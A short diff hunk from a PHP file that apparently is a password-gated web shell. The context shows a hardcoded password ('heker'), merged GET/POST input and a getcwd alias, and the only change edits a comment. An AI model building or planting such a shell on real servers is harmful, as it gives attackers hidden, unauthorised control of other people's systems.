@@ -30,7 +30,7 @@ date_default_timezone_set("Asia/Jakarta");
 $_7 = array_merge($_POST, $_GET);
 $_r = "required='required'";
 $gcw = "getcwd";
-$correctPassword = "heker"; //Change Password
+$correctPassword = "heker"; //Change Passwords
 if (isset($_POST['pass'])) {
     $enteredPassword = $_POST['pass'];
 
